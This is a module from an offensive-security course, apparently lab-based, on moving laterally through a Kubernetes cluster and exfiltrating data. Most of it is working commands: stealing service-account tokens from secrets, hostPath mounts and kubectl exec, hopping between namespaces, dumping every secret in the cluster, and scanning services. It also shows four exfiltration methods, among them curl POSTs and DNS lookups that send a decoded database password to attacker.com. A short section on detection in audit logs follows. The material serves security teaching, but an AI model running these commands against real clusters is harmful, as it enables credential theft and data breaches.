# Lateral Movement and Data Exfiltration — Chaining Footholds to Crown Jewels

> **Module 04 · Course 38** — You have a shell inside a pod. Good start. But that one pod doesn't have the crown jewels. The database credentials are in a different namespace. The admin token is in a pod you can't exec into directly. This module covers the attacker's art of pivoting: using what you have to get to what you want, one hop at a time.

---

## The Mental Model: Lateral Movement as a Graph Problem

A Kubernetes cluster is a graph:
- **Nodes:** pods, namespaces, secrets, service accounts, cloud resources
- **Edges:** tokens (can authenticate as), RBAC permissions (can read/write), network paths (can reach)

Lateral movement is finding a path through this graph from your foothold to the target.

```
Your foothold pod                                 Crown Jewels
(dojo-poc/attacker-pod)                           (prod/db-creds secret)

attacker-pod
  ├── SA token: dojo-poc/default          ─► can list pods in dojo-poc
  │     └── can get secrets in dojo-poc?  ─► YES
  │           └── secret: dev-token       ─► JWT for dev-sa
  │                 └── dev-sa perms?     ─► can get pods in staging
  │                       └── staging/app ─► SA token staging/app-sa
  │                             └── perms ─► can get secrets in prod
  │                                   └► prod/db-creds ← GOAL
  └── network: can reach staging services ─► direct API calls
```

You need to map this graph. Let's do it.

---

## Step 1: Enumerate From Your Foothold

The first thing you do from inside a pod:

```bash
# Who am I?
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace   # your namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/token       # your SA JWT

# What can I do with this token?
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"
CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# Self-check: what am I?
curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces | python3 -c "import sys,json; d=json.load(sys.stdin); [print(i['metadata']['name']) for i in d['items']]"
# Lists namespaces your SA can see

# Can I read secrets in my namespace?
curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$(cat /run/secrets/kubernetes.io/serviceaccount/namespace)/secrets
```

**Better: use kubectl if it's available in the pod:**

```bash
# Many hardened pods don't have kubectl — but busybox/alpine base images often do
which kubectl 2>/dev/null || echo "no kubectl, use curl"

# If kubectl is there:
kubectl auth can-i --list   # print everything this SA can do
kubectl get secrets          # in current namespace
kubectl get secrets --all-namespaces 2>/dev/null   # if you have list perms cluster-wide
```

---

## Step 2: Token Pivoting — Stealing Other SAs' Tokens

ServiceAccount tokens are mounted into pods at `/var/run/secrets/kubernetes.io/serviceaccount/token`. If you can read another pod's filesystem (via hostPath, or if you have read access to the pod's secret), you can steal its token.

**Method 1: Direct from the pod's secret (if you have RBAC)**

```bash
# List secrets in a namespace
kubectl get secrets -n staging

# Spot SA tokens (type: kubernetes.io/service-account-token)
kubectl get secrets -n staging -o custom-columns='NAME:.metadata.name,TYPE:.type' \
  | grep service-account-token

# Read a specific one
kubectl get secret staging-app-sa-token -n staging -o jsonpath='{.data.token}' \
  | base64 -d > /tmp/stolen-token

# Now use the stolen token
kubectl --token=$(cat /tmp/stolen-token) get secrets -n prod
```

**Method 2: From a hostPath mount (if the pod mounts the host FS)**

If a pod has `hostPath: /` (the entire node FS), you can read every token on the node:

```bash
# From inside the privileged pod with hostPath: /
find /host -name "token" -path "*/serviceaccount/*" 2>/dev/null | head -20
# /host/var/lib/kubelet/pods/<uuid>/volumes/kubernetes.io~secret/<secret-name>/token

cat /host/var/lib/kubelet/pods/abc123.../volumes/.../token | base64 -d
# Service account token for ANOTHER pod on the same node
```

**Why this works:**

```
Node
├── kubelet stores pod secrets at /var/lib/kubelet/pods/<uuid>/volumes/
├── Pod A has hostPath: /  (mounts entire node FS)
│   └── Pod A can read /var/lib/kubelet/pods/<uuid>/ for ALL pods on this node
│         └── including their SA tokens
└── Attacker in Pod A steals Pod B's token without ever exec-ing into Pod B
```

---

## Step 3: Namespace Hopping

Once you have a token from a different namespace, you can pivot:

```bash
# You stole a token for staging/app-sa
STAGING_TOKEN=$(cat /tmp/stolen-staging-token)

# What can staging/app-sa do?
kubectl --token=$STAGING_TOKEN auth can-i --list -n staging
kubectl --token=$STAGING_TOKEN auth can-i --list -n prod

# Can it read prod secrets?
kubectl --token=$STAGING_TOKEN get secrets -n prod
# If yes: direct access to prod secrets
# If no: pivot again — find a pod in staging that has more permissions
```

**Finding over-permissioned service accounts (the pivot targets):**

```bash
# From inside the cluster, enumerate ClusterRoleBindings — where are powerful SAs?
kubectl get clusterrolebindings -o wide | grep -i admin
# NAME                    ROLE                              SUBJECTS
# dangerous-crb           ClusterRole/cluster-admin         ServiceAccount/prod/app-sa
#                                                            ^^^ this SA has cluster-admin!

# Find it and steal its token
kubectl get pods -n prod -o wide  # find the pod using prod/app-sa
kubectl get pods -n prod -o jsonpath='{range .items[*]}{.metadata.name}{"/"}{.spec.serviceAccountName}{"\n"}{end}'
# payment-pod/app-sa   ← this pod uses the cluster-admin SA
kubectl exec -n prod payment-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
# BOOM — cluster-admin token
```

---

## Step 4: Reading Secrets at Scale

Once you have sufficient RBAC permissions:

```bash
# Dump all secrets across all namespaces
kubectl get secrets --all-namespaces -o json \
  | python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
for item in d['items']:
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    for k, v in item.get('data', {}).items():
        try:
            decoded = base64.b64decode(v).decode('utf-8', errors='replace')
            print(f'{ns}/{name}/{k}: {decoded[:100]}')
        except:
            pass
"

# Target high-value secret names
kubectl get secrets --all-namespaces | grep -iE "(db|postgres|mysql|redis|api.key|password|token|credentials)"

# Decode a specific secret's data field (no jq needed)
kubectl get secret db-creds -n prod -o jsonpath='{.data.password}' | base64 -d
```

---

## Step 5: Kubernetes Service Enumeration

From inside a pod, the cluster's internal DNS reveals its topology:

```bash
# Every service in the cluster is reachable as:
# <service-name>.<namespace>.svc.cluster.local

# Brute-force common service names:
for svc in postgres mysql redis mongodb kafka elasticsearch kibana grafana; do
  for ns in default staging prod kube-system monitoring; do
    result=$(nslookup ${svc}.${ns}.svc.cluster.local 2>&1)
    if echo "$result" | grep -q "Address"; then
      echo "FOUND: ${svc}.${ns}.svc.cluster.local"
    fi
  done
done

# Or list directly (if you have RBAC):
kubectl get services --all-namespaces
```

**Network paths from your pod:**

```bash
# Scan the node's subnet (if hostNetwork: true)
# Or scan the service CIDR (default: 10.96.0.0/12 in many clusters)
for i in $(seq 1 254); do
  curl -s --connect-timeout 1 http://10.96.0.$i:8080 2>/dev/null && echo "10.96.0.$i:8080 open"
done &

# Check API server directly (always accessible from pods)
curl -sk https://kubernetes.default.svc/api
```

---

## Step 6: Data Exfiltration Techniques

You've found the data. Now get it out without alerting anyone.

**Method 1: Direct HTTPS to attacker server**

```bash
# From inside pod — if egress isn't blocked
curl -X POST https://attacker.com/collect \
  -H "Content-Type: application/json" \
  -d "{\"data\": \"$(kubectl get secret db-creds -n prod -o jsonpath='{.data.password}' | base64 -d)\"}"
```

**Method 2: DNS Exfiltration (bypasses HTTP egress blocks)**

DNS is almost never blocked. Encode data as subdomains:

```bash
# Encode the secret value as a DNS subdomain
SECRET=$(kubectl get secret db-creds -n prod -o jsonpath='{.data.password}' | base64 -d | xxd -p | tr -d '\n')

# Split into 60-char chunks (DNS label limit) and exfil via DNS lookup
echo "$SECRET" | fold -w60 | while read chunk; do
  nslookup "${chunk}.exfil.attacker.com" 1.2.3.4 &>/dev/null
done
# Attacker's DNS server logs every query — sees the encoded data
```

**Method 3: ConfigMap/Secret as a dead drop**

Create a temporary resource that an external agent reads and deletes:

```bash
kubectl create configmap exfil-$(date +%s) \
  --from-literal=data="$(kubectl get secret db-creds -n prod -o jsonpath='{.data.password}')" \
  --dry-run=client -o yaml | kubectl apply -f -
# Then attacker's external system polls for this configmap
```

**Method 4: Legitimate traffic patterns**

If the pod has an HTTP client, make the exfil look like normal application traffic:

```bash
# Package data as a normal-looking HTTP header
DATA=$(kubectl get secret db-creds -n prod -o jsonpath='{.data.password}' | base64 -d)
curl https://attacker.com/api/health -H "X-Request-ID: $(echo $DATA | base64 | tr -d '=')"
```

---

## Lateral Movement Detection (Teaser)

The blue team isn't asleep. Here's what these techniques look like in audit logs:

```
# Token theft via kubectl get secret:
verb: "get"
objectRef.resource: "secrets"
user.username: "system:serviceaccount:dojo-poc:default"
responseStatus.code: 200

# Namespace pivot:
verb: "list"
objectRef.resource: "pods"
objectRef.namespace: "prod"
user.username: "system:serviceaccount:staging:app-sa"
# ^^^ staging SA listing prod pods — that's unusual
```

Defenders alert on:
- Cross-namespace API calls from service accounts
- Bulk secret reads (more than N secrets per minute)
- DNS queries to unknown external domains from pods
- SA tokens being used from unusual source IPs (pod IPs that don't match where the token was mounted)

We'll build these detections in modules 06 and 11.

---

## The Lateral Movement Kill Chain (Full Diagram)

```
FOOTHOLD                   HOP 1                    HOP 2                    GOAL
─────────                  ─────                    ─────                    ────
dojo-poc/attacker-pod      staging/app-sa           prod/admin-sa            prod/db-creds
  │                            │                        │
  │  kubectl get secret        │  kubectl get pod        │  kubectl get secret
  │  dev-token (ns: dojo-poc)  │  payment-pod (staging)  │  db-creds (ns: prod)
  │                            │                        │
  ▼                            ▼                        ▼
  dev-sa JWT             payment-pod token        EXFIL via DNS
  base64 decode          /var/run/secrets/...     or curl POST
  use as --token=...     cat → base64 -d          or dead-drop CM

Each hop:
1. Use current token to discover next target (pod/secret/SA)
2. Read the next token (via RBAC, hostPath, or kubectl exec)
3. Verify new token's permissions
4. Move on
```

---

## Checkpoint

1. What is the path where Kubernetes mounts a pod's ServiceAccount token?
2. If a pod has `hostPath: /` mounted, what can it read on the node's filesystem?
3. What kubectl command lists everything a ServiceAccount is permitted to do?
4. How would you use a stolen SA token with kubectl instead of your own credentials?
5. What RBAC resource would you query to find over-permissioned service accounts?
6. Why is DNS exfiltration harder to block than HTTP exfiltration?
7. What does cross-namespace API activity look like in a Kubernetes audit log?
8. What is `kubectl get secrets --all-namespaces` and when would an attacker run it?
9. How does a ClusterRoleBinding become an attacker's lateral movement opportunity?
10. If egress is blocked but DNS is allowed, how can an attacker still exfiltrate a 50-character secret?

➡ Next: **Cloud IAM & Metadata Service Attacks** — the IMDS exposes cloud credentials to any pod that asks.
